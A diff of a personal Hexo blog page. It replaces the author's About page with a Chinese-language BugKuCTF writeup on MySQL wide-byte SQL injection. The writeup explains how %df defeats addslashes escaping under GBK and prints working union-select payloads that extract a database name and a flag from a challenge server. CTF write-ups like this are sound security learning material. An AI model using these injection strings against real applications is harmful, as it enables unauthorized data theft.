@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="CTF," />
 
 
 
@@ -86,17 +86,22 @@
 
 
 
-<meta name="description" content="关于我哈尔滨工程大学软件学院 CS专业学生 CTF小白 联系我 GitHub:   marsguest email: marsguest@126.com QQ:  799261412 CSDN:  Mars_guest  关于本站写博客的本意首先是为了记录自己学习生活中遇到的问题和解决问题的方法，这样以后遇到同类问题或者是与之相似的问题就可以回来翻翻博客寻找答案。 其次记录博客的过程其实是二次学习">
-<meta property="og:type" content="website">
-<meta property="og:title" content="About">
-<meta property="og:url" content="http://yoursite.com/about/index.html">
+<meta name="description" content="BugKuCTF—sql注入Writeup原题地址 http://103.238.227.13:10083/首先构造链接 1http://103.238.227.13:10083/?id=1&amp;apos; 发现存在过滤，页面没什么反应。右键源文件，发现编码规则GB-2312，猜测为mysql宽字节注入">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BugKuCTF---sql注入Writeup">
+<meta property="og:url" content="http://yoursite.com/2018/04/22/2018-04-22-sqlPOC/index.html">
 <meta property="og:site_name" content="Marsguest&#39;s Blog">
-<meta property="og:description" content="关于我哈尔滨工程大学软件学院 CS专业学生 CTF小白 联系我 GitHub:   marsguest email: marsguest@126.com QQ:  799261412 CSDN:  Mars_guest  关于本站写博客的本意首先是为了记录自己学习生活中遇到的问题和解决问题的方法，这样以后遇到同类问题或者是与之相似的问题就可以回来翻翻博客寻找答案。 其次记录博客的过程其实是二次学习">
+<meta property="og:description" content="BugKuCTF—sql注入Writeup原题地址 http://103.238.227.13:10083/首先构造链接 1http://103.238.227.13:10083/?id=1&amp;apos; 发现存在过滤，页面没什么反应。右键源文件，发现编码规则GB-2312，猜测为mysql宽字节注入">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-04-14T10:15:06.319Z">
+<meta property="og:image" content="http://yoursite.com/images/2018042201.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2018042202.jpg">
+<meta property="og:image" content="http://yoursite.com/images/2018042203.jpg">
+<meta property="og:updated_time" content="2018-04-22T11:30:49.790Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="About">
-<meta name="twitter:description" content="关于我哈尔滨工程大学软件学院 CS专业学生 CTF小白 联系我 GitHub:   marsguest email: marsguest@126.com QQ:  799261412 CSDN:  Mars_guest  关于本站写博客的本意首先是为了记录自己学习生活中遇到的问题和解决问题的方法，这样以后遇到同类问题或者是与之相似的问题就可以回来翻翻博客寻找答案。 其次记录博客的过程其实是二次学习">
+<meta name="twitter:title" content="BugKuCTF---sql注入Writeup">
+<meta name="twitter:description" content="BugKuCTF—sql注入Writeup原题地址 http://103.238.227.13:10083/首先构造链接 1http://103.238.227.13:10083/?id=1&amp;apos; 发现存在过滤，页面没什么反应。右键源文件，发现编码规则GB-2312，猜测为mysql宽字节注入">
+<meta name="twitter:image" content="http://yoursite.com/images/2018042201.jpg">
 
 
 
@@ -126,13 +131,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/about/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/04/22/2018-04-22-sqlPOC/"/>
 
 
 
 
 
-  <title>About | Marsguest's Blog</title>
+  <title>BugKuCTF---sql注入Writeup | Marsguest's Blog</title>
   
 
 
@@ -291,70 +296,220 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/22/2018-04-22-sqlPOC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Marsguest">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avator.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Marsguest's Blog">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">About</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
-          <h2 id="关于我"><a href="#关于我" class="headerlink" title="关于我"></a>关于我</h2><p><em>哈尔滨工程大学软件学院</em></p>
-<p><em>CS专业学生</em></p>
-<p><em>CTF小白</em></p>
-<h2 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h2><ul>
-<li><strong>GitHub:</strong>   <a href="https://github.com/marsguest" target="_blank" rel="noopener">marsguest</a></li>
-<li><strong>email:</strong> <a href="mailto:marsguest@126.com" target="_blank" rel="noopener">marsguest@126.com</a></li>
-<li><strong>QQ:</strong>  799261412</li>
-<li><strong>CSDN:</strong>  <a href="https://blog.csdn.net/Mars_guest" target="_blank" rel="noopener">Mars_guest</a></li>
-</ul>
-<h2 id="关于本站"><a href="#关于本站" class="headerlink" title="关于本站"></a>关于本站</h2><p>写博客的本意首先是为了记录自己学习生活中遇到的问题和解决问题的方法，这样以后遇到同类问题或者是与之相似的问题就可以回来翻翻博客寻找答案。</p>
-<p>其次记录博客的过程其实是<strong>二次学习</strong>的过程。在写博客的过程中，能及时对自己学过的知识进行复习和总结，加深自己对当前问题的理解</p>
-<p>再次就是希望自己解决问题的过程对他人能够有所帮助。因为自己也常年混迹各大博客圈，明白一篇好的技术博客能给人提供很多思路。我也希望我的博文能够给大家提供不一样的思路。</p>
-<p>最后，写点东西锻炼锻炼文笔什么的也不错。</p>
-<h2 id="Update-Log"><a href="#Update-Log" class="headerlink" title="Update Log"></a>Update Log</h2><p><em>2018.4.5</em></p>
-<ul>
-<li>搭建了自己的第一个个人博客。</li>
-<li>完成博客转移</li>
-</ul>
-<p><em>2018.4.7</em></p>
-<ul>
-<li>更新aboutme界面</li>
-</ul>
-<p><em>2018.4.11</em></p>
-<ul>
-<li>新建分类 –杂谈</li>
-</ul>
-<p><em>2018.4.12</em></p>
-<ul>
-<li>绑定域名 marguest.com</li>
-</ul>
-<p><em>2018.4.14</em></p>
-<ul>
-<li>更换框架至hexo</li>
-</ul>
-<h2 id="友情链接"><a href="#友情链接" class="headerlink" title="友情链接"></a>友情链接</h2><ul>
-<li><a href="https://blog.csdn.net/qq_40574571" target="_blank" rel="noopener">never疯</a></li>
-</ul>
-
+          <h1 class="post-title" itemprop="name headline">BugKuCTF---sql注入Writeup</h1>
         
-      </div>
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-22T19:28:13+08:00">
+                2018-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF_Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>浏览量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h1 id="BugKuCTF—sql注入Writeup"><a href="#BugKuCTF—sql注入Writeup" class="headerlink" title="BugKuCTF—sql注入Writeup"></a>BugKuCTF—sql注入Writeup</h1><p>原题地址 <a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a><br>首先构造链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p>发现存在过滤，页面没什么反应。右键源文件，发现编码规则GB-2312，猜测为mysql宽字节注入<br><a id="more"></a><br><img src="/images/2018042201.jpg" alt="这里写图片描述"></p>
+<hr>
+<p>简单讲解什么是<strong>宽字节注入</strong>：<br>1.服务器在GET到前端发来的数据后，通过php的addslashes，mysql_real_escape_string，mysql_escape_string等函数，能够对特定的字符进行过滤，在它的前面添加转义字符\,从而使得之后拼接sql语句时，这些特定的字符失效.<br>过滤的字符包括</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）          ASCII（NULL）字符\x00，</span><br><span class="line">（2）          换行字符\n，addslashes不转义</span><br><span class="line">（3）          回车字符\r，addslashes不转义</span><br><span class="line">（4）          反斜杠字符\，</span><br><span class="line">（5）          单引号字符&apos;，</span><br><span class="line">（6）          双引号字&quot;，</span><br><span class="line">（7）          \x1a，addslashes不转义</span><br></pre></td></tr></table></figure>
+<p>2.mysql在使用GBK编码的时候，会认为两个字符为一个汉字，当我们将注入连接写成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df&apos;</span><br></pre></td></tr></table></figure>
+<p><strong>%df’</strong> 传到后台php处理后变成<strong>%df\’</strong>,此时，%df\’对应的编码就是<strong>%df%5c’</strong>，即汉字“<strong>運’</strong>”,这样就相当于将php用于过滤而加上的转义字符 \ 吞掉了，从而实现过滤的绕过.</p>
+<hr>
+<p>继续之前的题，利用宽字节注入构造注入POC,爆库名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df&apos; union select 1,database() %23</span><br></pre></td></tr></table></figure>
+<p>这里%23是字符#，mysql中的注释专用字符，将后面的引号注释掉<br><img src="/images/2018042202.jpg" alt="这里写图片描述"><br>发现数据库sql5，之后根据提示构造POC得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%df&apos; union select 1,string from sql5.key %23</span><br></pre></td></tr></table></figure>
+<p><img src="/images/2018042203.jpg" alt="这里写图片描述"></p>
+
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+    <div>
+	  
+	    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/21/2018-04-21-upload/" rel="next" title="第三届“百越杯”福建省高校网络空间安全大赛Do you know upload？Writeup">
+                <i class="fa fa-chevron-left"></i> 第三届“百越杯”福建省高校网络空间安全大赛Do you know upload？Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+<span class="jiathis_txt">分享到：</span>
+<a class="jiathis_button_fav">收藏夹</a>
+<a class="jiathis_button_copy">复制网址</a>
+<a class="jiathis_button_email">邮件</a>
+<a class="jiathis_button_weixin">微信</a>
+<a class="jiathis_button_qzone">QQ空间</a>
+<a class="jiathis_button_tqq">腾讯微博</a>
+<a class="jiathis_button_douban">豆瓣</a>
+<a class="jiathis_button_share">一键分享</a>
+
+<a href="http://www.jiathis.com/share?uid=2140465" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank">更多</a>
+<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+var jiathis_config={
+  data_track_clickback:true,
+  summary:"",
+  shortUrl:false,
+  hideMore:false
+}
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+      
+    </div>
   </div>
 
 
@@ -498,7 +653,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于我"><span class="nav-number">1.</span> <span class="nav-text">关于我</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联系我"><span class="nav-number">2.</span> <span class="nav-text">联系我</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于本站"><span class="nav-number">3.</span> <span class="nav-text">关于本站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Update-Log"><span class="nav-number">4.</span> <span class="nav-text">Update Log</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#友情链接"><span class="nav-number">5.</span> <span class="nav-text">友情链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BugKuCTF—sql注入Writeup"><span class="nav-number">1.</span> <span class="nav-text">BugKuCTF—sql注入Writeup</span></a></li></ol></div>
             
 
           </div>
